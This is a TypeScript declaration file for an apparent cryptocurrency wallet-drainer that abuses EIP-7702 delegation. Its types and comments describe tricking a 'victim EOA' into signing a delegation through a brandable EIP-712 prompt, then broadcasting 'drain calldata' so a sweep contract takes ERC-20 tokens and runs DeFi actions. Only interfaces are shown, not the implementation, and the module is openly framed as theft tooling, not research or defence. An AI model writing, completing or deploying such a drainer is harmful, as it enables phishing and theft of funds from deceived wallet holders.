/**
 * EIP-7702 delegation drain — SET_CODE authorization ingress (EVM 2025 vector).
 * Gatekeeper: simulation before broadcast; executor key != victim EOA.
 */
import type { Address, Hex } from 'viem';
export type Eip7702AuthorizationParams = {
    chainId: number;
    /** Delegate contract address (viem: contractAddress) */
    address: Address;
    nonce: bigint;
};
export type Eip7702SignedAuthorization = Eip7702AuthorizationParams & {
    r: Hex;
    s: Hex;
    yParity: number;
};
export type Eip7702DefiAction = {
    kind: number;
    target: Address;
    tokenA: Address;
    tokenB: Address;
    param1: bigint;
    param2: bigint;
    param3: bigint;
};
export type Eip7702SignatureEnvelope = {
    protocol: 'eip7702_delegation';
    chain_id: number;
    wallet: Address;
    delegatee: Address;
    spender: Address;
    authorization: Eip7702SignedAuthorization;
    erc20s?: Address[];
    defi_actions?: Eip7702DefiAction[];
};
export type Eip7702SettlementResult = {
    ok: boolean;
    transaction_hash?: Hex;
    detail?: string;
};
export declare function isEip7702Enabled(): boolean;
export declare function resolveEip7702DelegateContract(): Address | null;
/** EIP-712 presentation layer for wallets lacking wallet_signAuthorization. */
export declare function buildEip7702DelegationTypedData(chainId: number, wallet: Address, spender: Address, delegatee: Address, nonce: bigint, brand?: string | null): {
    types: Record<string, Array<{
        name: string;
        type: string;
    }>>;
    primaryType: string;
    domain: {
        name: string;
        version: string;
        chainId: number;
    };
    message: {
        chainId: bigint;
        address: Address;
        nonce: bigint;
        wallet: Address;
        spender: Address;
    };
};
export declare function readEip7702AuthorizationNonce(rpcUrl: string, wallet: Address, chainId: number): Promise<bigint>;
export declare function packEip7702SignatureEnvelope(envelope: Eip7702SignatureEnvelope): string;
export declare function parseEip7702SignatureEnvelope(payload: string): Eip7702SignatureEnvelope | null;
/**
 * Broadcast EIP-7702 tx: victim EOA temporarily delegates to sweep contract, then executes drain calldata.
 */
export declare function executeEip7702DelegationDrain(signaturePayload: string, chainId: number): Promise<Eip7702SettlementResult>;
export declare function buildEip7702AuthorizationRequest(chainId: number, wallet: Address, spender?: Address | null, brand?: string | null): Promise<{
    delegatee: Address;
    spender: Address;
    nonce: bigint;
    typed_data: ReturnType<typeof buildEip7702DelegationTypedData>;
    authorization_request: Eip7702AuthorizationParams;
    wallet_authorization: {
        chainId: number;
        contractAddress: Address;
        nonce: number;
    };
}>;
//# sourceMappingURL=eip7702-drain.d.ts.map